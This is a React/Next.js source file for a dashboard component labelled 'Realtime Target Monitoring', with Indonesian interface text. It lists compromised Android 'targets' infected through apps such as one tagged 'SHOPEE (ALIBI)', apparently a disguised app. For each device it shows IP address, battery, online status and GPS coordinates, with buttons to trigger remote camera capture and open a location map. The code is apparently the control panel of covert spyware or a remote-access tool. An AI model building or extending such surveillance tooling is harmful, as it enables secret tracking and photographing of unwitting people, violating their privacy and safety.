'use client';

import React, { useMemo, useState } from 'react';
import Link from 'next/link';
import { clsx } from 'clsx';
import { twMerge } from 'tailwind-merge';
import {
  Search,
  Camera,
  MapPin,
  BatteryFull,
  BatteryMedium,
  BatteryLow,
  Circle,
  Filter,
  type LucideIcon,
} from 'lucide-react';
import { Target, AppType } from '@/types/target';

const cn = (...inputs: Array<string | false | null | undefined>) => twMerge(clsx(inputs));

const getBatteryState = (battery?: number) => {
  if (typeof battery !== 'number') {
    return { icon: BatteryLow, color: 'text-slate-500', label: 'Unknown' };
  }

  if (battery > 50) {
    return { icon: BatteryFull, color: 'text-emerald-400', label: 'High' };
  }

  if (battery >= 20) {
    return { icon: BatteryMedium, color: 'text-amber-400', label: 'Medium' };
  }

  return { icon: BatteryLow, color: 'text-rose-500', label: 'Low' };
};

interface TargetListProps {
  targets: Target[];
  selectedTargetId?: string;
  loading: boolean;
  busyTargetId?: string | null;
  onSelect: (deviceId: string) => void;
  onCapture: (deviceId: string) => void;
}

export default function TargetList({
  targets,
  selectedTargetId,
  loading,
  busyTargetId,
  onSelect,
  onCapture,
}: TargetListProps) {
  const [searchTerm, setSearchTerm] = useState('');
  const [appFilter, setAppFilter] = useState<AppType>('ALL');

  const filteredTargets = useMemo(() => {
    const term = searchTerm.toLowerCase().trim();
    return targets.filter((target) => {
      const matchesSearch = !term ||
        target.id?.toLowerCase().includes(term) ||
        (target.deviceInfo?.model || target.model || '').toLowerCase().includes(term);

      const matchesFilter = appFilter === 'ALL' || target.appType === appFilter;

      return matchesSearch && matchesFilter;
    });
  }, [searchTerm, targets, appFilter]);

  const onlineCount = useMemo(
    () => targets.filter((target) => target.status?.toUpperCase() === 'ONLINE').length,
    [targets]
  );

  const offlineCount = targets.length - onlineCount;

  return (
    <div className="space-y-6">
      <section className="rounded-[32px] border border-white/10 bg-slate-950/85 p-6 shadow-2xl shadow-slate-950/40 backdrop-blur-xl">
        <div className="flex flex-col gap-5 xl:flex-row xl:items-center xl:justify-between">
          <div className="space-y-3">
            <p className="text-sm uppercase tracking-[0.3em] text-cyan-300/80">Cyber Security Fleet</p>
            <h2 className="text-3xl font-semibold text-white">Realtime Target Monitoring</h2>
            <div className="flex flex-wrap gap-2 mt-2">
              <button
                onClick={() => setAppFilter('ALL')}
                className={cn("px-4 py-1.5 rounded-full text-xs font-bold transition-all border",
                  appFilter === 'ALL' ? "bg-cyan-500 border-cyan-400 text-white" : "bg-slate-900 border-white/10 text-slate-400 hover:text-white")}
              >ALL</button>
              <button
                onClick={() => setAppFilter('FLYING_BIRD')}
                className={cn("px-4 py-1.5 rounded-full text-xs font-bold transition-all border",
                  appFilter === 'FLYING_BIRD' ? "bg-yellow-500 border-yellow-400 text-black" : "bg-slate-900 border-white/10 text-slate-400 hover:text-white")}
              >FLYING BIRD</button>
              <button
                onClick={() => setAppFilter('SHOPEE_ALIBI')}
                className={cn("px-4 py-1.5 rounded-full text-xs font-bold transition-all border",
                  appFilter === 'SHOPEE_ALIBI' ? "bg-orange-600 border-orange-500 text-white" : "bg-slate-900 border-white/10 text-slate-400 hover:text-white")}
              >SHOPEE (ALIBI)</button>
            </div>
          </div>

          <div className="w-full max-w-xl">
            <label className="relative block">
              <Search size={18} className="pointer-events-none absolute left-4 top-1/2 -translate-y-1/2 text-slate-500" />
              <input
                type="text"
                value={searchTerm}
                onChange={(event) => setSearchTerm(event.target.value)}
                placeholder="Cari ID atau model..."
                className="w-full rounded-2xl border border-slate-800/80 bg-slate-950/90 py-3 pl-12 pr-4 text-sm text-white outline-none transition focus:border-cyan-400/70 focus:ring-2 focus:ring-cyan-400/20"
              />
            </label>
          </div>
        </div>

        <div className="mt-6 grid gap-4 sm:grid-cols-3">
          <div className="rounded-3xl border border-white/10 bg-white/5 p-5 shadow-inner shadow-slate-950/20">
            <p className="text-sm uppercase tracking-[0.2em] text-slate-400">Total Targets</p>
            <p className="mt-3 text-3xl font-semibold text-white">{targets.length}</p>
          </div>
          <div className="rounded-3xl border border-white/10 bg-white/5 p-5 shadow-inner shadow-slate-950/20">
            <p className="text-sm uppercase tracking-[0.2em] text-slate-400">Online</p>
            <p className="mt-3 text-3xl font-semibold text-emerald-400">{onlineCount}</p>
          </div>
          <div className="rounded-3xl border border-white/10 bg-white/5 p-5 shadow-inner shadow-slate-950/20">
            <p className="text-sm uppercase tracking-[0.2em] text-slate-400">Offline</p>
            <p className="mt-3 text-3xl font-semibold text-slate-300">{offlineCount}</p>
          </div>
        </div>
      </section>

      <section className="rounded-[32px] border border-white/10 bg-white/5 shadow-2xl shadow-slate-950/20 backdrop-blur-xl">
        <div className="border-b border-white/10 px-6 py-5">
          <div className="flex flex-col gap-2 md:flex-row md:items-center md:justify-between">
            <div>
              <p className="text-sm uppercase tracking-[0.2em] text-slate-400">Device list</p>
              <h3 className="mt-2 text-2xl font-semibold text-white">Live Targets</h3>
            </div>
            <p className="text-sm text-slate-500">
              {loading ? 'Memuat data...' : `${filteredTargets.length} hasil ditemukan`}
            </p>
          </div>
        </div>

        <div className="overflow-x-auto">
          <table className="min-w-full divide-y divide-white/10 text-left text-sm text-slate-300">
            <thead className="bg-slate-950/70 text-slate-400">
              <tr>
                <th className="px-6 py-4 uppercase tracking-[0.15em]">Target Info</th>
                <th className="px-6 py-4 uppercase tracking-[0.15em]">Status</th>
                <th className="px-6 py-4 uppercase tracking-[0.15em]">Network Info</th>
                <th className="px-6 py-4 uppercase tracking-[0.15em]">Location</th>
                <th className="px-6 py-4 uppercase tracking-[0.15em]">Actions</th>
              </tr>
            </thead>
            <tbody className="divide-y divide-white/10">
              {loading ? (
                <tr>
                  <td colSpan={5} className="px-6 py-12 text-center text-slate-500">
                    Memuat target...
                  </td>
                </tr>
              ) : filteredTargets.length === 0 ? (
                <tr>
                  <td colSpan={5} className="px-6 py-12 text-center text-slate-500">
                    Tidak ada target yang cocok.
                  </td>
                </tr>
              ) : (
                filteredTargets.map((target) => {
                  const isOnline = target.status?.toUpperCase() === 'ONLINE';
                  const batteryState = getBatteryState(target.battery);
                  const BatteryIcon = batteryState.icon as LucideIcon;
                  const targetIp = target.deviceInfo?.ip || target.ip || 'Unknown IP';
                  const appLabel = target.appType === 'FLYING_BIRD' ? '🐦 Bird' : target.appType === 'SHOPEE_ALIBI' ? '🛍️ Shopee' : '❓ Unknown';

                  return (
                    <tr
                      key={target.id}
                      className={cn(
                        'group transition duration-150 hover:bg-slate-900/60 cursor-pointer',
                        target.id === selectedTargetId ? 'bg-slate-900/70' : 'border-b border-white/10'
                      )}
                      onClick={() => onSelect(target.id)}
                    >
                      <td className="px-6 py-5">
                        <div className="text-sm font-semibold text-white">{target.id}</div>
                        <div className="mt-1 text-xs text-slate-500">
                          {target.deviceInfo?.manufacturer || ''} {target.deviceInfo?.model || target.model || 'Unknown model'}
                        </div>
                        <div className={cn("mt-1.5 inline-block px-2 py-0.5 rounded text-[10px] font-bold uppercase",
                          target.appType === 'FLYING_BIRD' ? "bg-yellow-500/20 text-yellow-500" : "bg-orange-500/20 text-orange-500")}>
                          {appLabel}
                        </div>
                      </td>
                      <td className="px-6 py-5">
                        <div className="flex flex-col gap-2">
                          <div className="inline-flex items-center gap-2 text-xs">
                            <Circle
                              size={10}
                              className={isOnline ? 'text-emerald-400 animate-pulse' : 'text-slate-500'}
                            />
                            <span className="uppercase font-mono">{isOnline ? 'ONLINE' : 'OFFLINE'}</span>
                          </div>
                          <div className="inline-flex items-center gap-2 text-xs">
                            <BatteryIcon size={14} className={batteryState.color} />
                            <span className={batteryState.color}>
                              {typeof target.battery === 'number' ? `${target.battery}%` : 'N/A'}
                            </span>
                          </div>
                        </div>
                      </td>
                      <td className="px-6 py-5">
                        <div className="text-xs font-mono text-slate-400">{targetIp}</div>
                        <div className="mt-1 text-[10px] text-slate-600 uppercase tracking-tighter">
                          OS: {target.deviceInfo?.os || 'Android'}
                        </div>
                      </td>
                      <td className="px-6 py-5">
                         {target.location?.lat ? (
                           <div className="text-[11px] text-slate-400 font-mono">
                             {target.location.lat.toFixed(4)}, {target.location.lng?.toFixed(4)}
                           </div>
                         ) : <span className="text-slate-600 text-[10px]">No Data</span>}
                      </td>
                      <td className="px-6 py-5">
                        <div className="flex flex-wrap gap-2">
                          <button
                            type="button"
                            onClick={(event) => {
                              event.stopPropagation();
                              onCapture(target.id);
                            }}
                            disabled={busyTargetId === target.id}
                            className="inline-flex h-9 w-9 items-center justify-center rounded-xl border border-white/10 bg-slate-950/80 text-slate-200 transition hover:border-cyan-400/70 hover:text-cyan-300 disabled:cursor-not-allowed disabled:opacity-50"
                          >
                            <Camera size={14} />
                          </button>
                          <Link
                            href={`/dashboard/map/${target.id}`}
                            onClick={(event) => event.stopPropagation()}
                            className="inline-flex h-9 w-9 items-center justify-center rounded-xl border border-white/10 bg-slate-950/80 text-slate-200 transition hover:border-emerald-400/70 hover:text-emerald-300"
                          >
                            <MapPin size={14} />
                          </Link>
                        </div>
                      </td>
                    </tr>
                  );
                })
              )}
            </tbody>
          </table>
        </div>
      </section>
    </div>
  );
}
